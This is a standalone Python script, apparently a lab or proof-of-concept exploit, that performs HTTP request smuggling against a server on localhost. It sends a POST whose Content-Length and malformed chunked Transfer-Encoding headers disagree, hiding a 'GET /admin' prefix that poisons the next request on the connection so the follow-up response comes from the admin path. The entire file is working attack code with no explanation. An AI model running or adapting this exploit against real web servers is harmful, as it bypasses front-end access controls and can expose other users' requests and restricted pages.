#!/usr/bin/env python3
import re
import socket
import sys

HOST = "localhost"
PORT = 80

SMUGGLED = (
    b"GET /admin HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"X-Absorb: "
)

BODY = b"0\r\n\r\n" + SMUGGLED


def build_requests() -> tuple[bytes, bytes]:
    r1 = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(BODY)).encode() + b"\r\n"
        b"Transfer-Encoding: chunked \r\n"
        b"Connection: keep-alive\r\n"
        b"\r\n"
    ) + BODY
    r2 = (
        b"GET / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Cookie: session=RANDOM\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    return r1, r2


def read_response(s: socket.socket) -> bytes:
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf:
                m = re.search(rb"Content-Length: (\d+)", buf)
                if m:
                    cl = int(m.group(1))
                    hdr_end = buf.index(b"\r\n\r\n") + 4
                    if len(buf) >= hdr_end + cl:
                        break
    except socket.timeout:
        pass
    return buf


def send_attack() -> None:
    r1, r2 = build_requests()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((HOST, PORT))
    except ConnectionRefusedError:
        print(f"[!] Connection refused at {HOST}:{PORT}")
        sys.exit(1)

    print("[*] Sending request 1 (smuggling)")
    s.sendall(r1)
    resp1 = read_response(s)
    print("[+] Response 1:", resp1.split(b"\r\n")[0].decode())
    print()

    print("[*] Sending request 2 (follow-up — expects /admin due to smuggled prefix)")
    s.sendall(r2)
    resp2 = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp2 += chunk
    except socket.timeout:
        pass
    s.close()

    print("[+] Response 2:")
    print(resp2.decode(errors="replace"))


if __name__ == "__main__":
    send_attack()
